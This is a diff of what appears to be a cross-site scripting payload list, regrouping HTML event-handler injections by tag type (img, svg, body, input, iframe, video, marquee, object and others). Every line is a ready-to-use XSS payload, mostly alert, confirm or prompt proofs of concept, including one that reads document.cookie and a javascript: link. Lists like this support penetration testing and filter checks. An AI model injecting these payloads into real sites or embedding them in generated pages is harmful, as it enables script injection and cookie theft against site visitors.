@@ -1,52 +1,57 @@
-<!-- Image events -->
+<!-- IMG -->
 <img src=x onerror=alert(1)>
-<img src=1 onerror=alert(document.domain)>
+<img src=1 onerror=alert(document.cookie)>
 <img src=x onerror="javascript:alert(1)">
 <img src=x onerror=confirm(1)>
 <img src=x onerror=prompt(1)>
 
-<!-- Body / page load -->
+<!-- SVG -->
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=confirm(1)>
+<svg onload=prompt(1)>
+
+<!-- BODY -->
 <body onload=alert(1)>
 <body onpageshow=alert(1)>
 
-<!-- Input / focus events -->
-<input autofocus onfocus=alert(1)>
+<!-- INPUT -->
+<input onfocus=alert(1) autofocus>
 <input onblur=alert(1) autofocus>
-<textarea autofocus onfocus=alert(1)>
+<input onchange=alert(1)>
+<input onmouseover=alert(1)>
 
-<!-- Mouse events -->
-<div onmouseover=alert(1)>hover</div>
-<div onmouseenter=alert(1)>hover</div>
-<div onmouseleave=alert(1)>hover</div>
-
-<!-- Click events -->
+<!-- BUTTON -->
 <button onclick=alert(1)>click</button>
+<button ondblclick=alert(1)>double</button>
+
+<!-- DIV -->
+<div onclick=alert(1)>click</div>
+<div onmouseover=alert(1)>hover</div>
+
+<!-- A TAG -->
 <a href=# onclick=alert(1)>click</a>
+<a href=javascript:alert(1)>link</a>
 
-<!-- Keyboard events -->
-<input onkeydown=alert(1)>
-<input onkeypress=alert(1)>
-<input onkeyup=alert(1)>
+<!-- IFRAME -->
+<iframe onload=alert(1)></iframe>
 
-<!-- Form events -->
-<form onsubmit=alert(1)>
-<input type=submit onclick=alert(1)>
-
-<!-- Media events -->
+<!-- VIDEO / AUDIO -->
 <video src=x onerror=alert(1)></video>
 <audio src=x onerror=alert(1)></audio>
 
-<!-- SVG events -->
-<svg onload=alert(1)>
-<svg><animate onbegin=alert(1) attributeName=x></svg>
+<!-- FORM -->
+<form onsubmit=alert(1)></form>
 
-<!-- iframe events -->
-<iframe onload=alert(1)></iframe>
+<!-- MARQUEE -->
+<marquee onstart=alert(1)></marquee>
 
-<!-- details/summary -->
-<details open ontoggle=alert(1)>
+<!-- DETAILS -->
+<details open ontoggle=alert(1)></details>
 
-<!-- select change -->
-<select onchange=alert(1)>
-<option>1</option>
-</select>
+<!-- OBJECT -->
+<object data=x onerror=alert(1)></object>
+
+<!-- MISC -->
+<select onchange=alert(1)><option>1</option></select>
+<textarea onfocus=alert(1) autofocus></textarea>
